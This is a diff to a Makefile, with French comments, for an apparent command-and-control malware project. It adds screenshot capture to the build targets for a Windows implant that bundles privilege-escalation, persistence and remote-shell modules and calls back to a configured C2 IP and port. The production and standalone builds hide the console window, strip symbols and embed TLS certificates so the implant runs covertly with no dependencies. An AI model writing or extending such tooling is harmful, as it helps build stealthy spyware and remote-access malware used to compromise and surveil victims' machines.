@@ -40,24 +40,26 @@ server: c2_server.c tls.c tls.h
 	@echo "[+] c2_server compilé (multi-client)"
 
 # Production : -mwindows = aucune fenêtre visible, -s = strip des symboles
-implant: $(IMPLANT_DIR)/implant.c tls.c tls.h $(IMPLANT_DIR)/privesc.c $(IMPLANT_DIR)/privesc.h $(PAYLOAD_DIR)/persist.c $(PAYLOAD_DIR)/persist.h $(PAYLOAD_DIR)/shell.c $(PAYLOAD_DIR)/shell.h
+implant: $(IMPLANT_DIR)/implant.c tls.c tls.h $(IMPLANT_DIR)/privesc.c $(IMPLANT_DIR)/privesc.h $(PAYLOAD_DIR)/persist.c $(PAYLOAD_DIR)/persist.h $(PAYLOAD_DIR)/shell.c $(PAYLOAD_DIR)/shell.h $(PAYLOAD_DIR)/screenshot.c $(PAYLOAD_DIR)/screenshot.h
 	gcc $(CFLAGS) \
 		-I. -I$(IMPLANT_DIR) -I$(PAYLOAD_DIR) \
 		-DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT) \
 		-o implant.exe $(IMPLANT_DIR)/implant.c tls.c $(IMPLANT_DIR)/privesc.c \
 		$(PAYLOAD_DIR)/persist.c \
 		$(PAYLOAD_DIR)/shell.c \
+		$(PAYLOAD_DIR)/screenshot.c \
 		$(WIN_LIBS) -static -s -mwindows
 	@echo "[+] implant.exe généré ($(C2_IP):$(C2_PORT)) — sans fenêtre, nécessite .env + certs/"
 
 # Debug : pas de -mwindows (console visible), pas de -s (symboles conservés)
-implant-debug: $(IMPLANT_DIR)/implant.c tls.c tls.h $(IMPLANT_DIR)/privesc.c $(IMPLANT_DIR)/privesc.h $(PAYLOAD_DIR)/persist.c $(PAYLOAD_DIR)/persist.h $(PAYLOAD_DIR)/shell.c $(PAYLOAD_DIR)/shell.h
+implant-debug: $(IMPLANT_DIR)/implant.c tls.c tls.h $(IMPLANT_DIR)/privesc.c $(IMPLANT_DIR)/privesc.h $(PAYLOAD_DIR)/persist.c $(PAYLOAD_DIR)/persist.h $(PAYLOAD_DIR)/shell.c $(PAYLOAD_DIR)/shell.h $(PAYLOAD_DIR)/screenshot.c $(PAYLOAD_DIR)/screenshot.h
 	gcc $(CFLAGS) \
 		-I. -I$(IMPLANT_DIR) -I$(PAYLOAD_DIR) \
 		-DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT) \
 		-o implant_debug.exe $(IMPLANT_DIR)/implant.c tls.c $(IMPLANT_DIR)/privesc.c \
 		$(PAYLOAD_DIR)/persist.c \
 		$(PAYLOAD_DIR)/shell.c \
+		$(PAYLOAD_DIR)/screenshot.c \
 		$(WIN_LIBS) -static
 	@echo "[+] implant_debug.exe généré ($(C2_IP):$(C2_PORT)) — avec console debug"
 
@@ -66,13 +68,14 @@ embed: gen-embed.sh
 	@echo "[+] embedded_certs.h généré"
 
 # Standalone : certs embarqués + sans fenêtre
-implant-standalone: $(IMPLANT_DIR)/implant.c tls.c tls.h $(IMPLANT_DIR)/privesc.c $(IMPLANT_DIR)/privesc.h $(PAYLOAD_DIR)/persist.c $(PAYLOAD_DIR)/persist.h $(PAYLOAD_DIR)/shell.c $(PAYLOAD_DIR)/shell.h embedded_certs.h
+implant-standalone: $(IMPLANT_DIR)/implant.c tls.c tls.h $(IMPLANT_DIR)/privesc.c $(IMPLANT_DIR)/privesc.h $(PAYLOAD_DIR)/persist.c $(PAYLOAD_DIR)/persist.h $(PAYLOAD_DIR)/shell.c $(PAYLOAD_DIR)/shell.h $(PAYLOAD_DIR)/screenshot.c $(PAYLOAD_DIR)/screenshot.h embedded_certs.h
 	gcc $(CFLAGS) \
 		-I. -I$(IMPLANT_DIR) -I$(PAYLOAD_DIR) \
 		-DEMBED_CERTS -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT) \
 		-o implant.exe $(IMPLANT_DIR)/implant.c tls.c $(IMPLANT_DIR)/privesc.c \
 		$(PAYLOAD_DIR)/persist.c \
 		$(PAYLOAD_DIR)/shell.c \
+		$(PAYLOAD_DIR)/screenshot.c \
 		$(WIN_LIBS) -static -s -mwindows
 	@echo "[+] implant.exe standalone généré ($(C2_IP):$(C2_PORT)) — sans fenêtre, zéro dépendance"
 
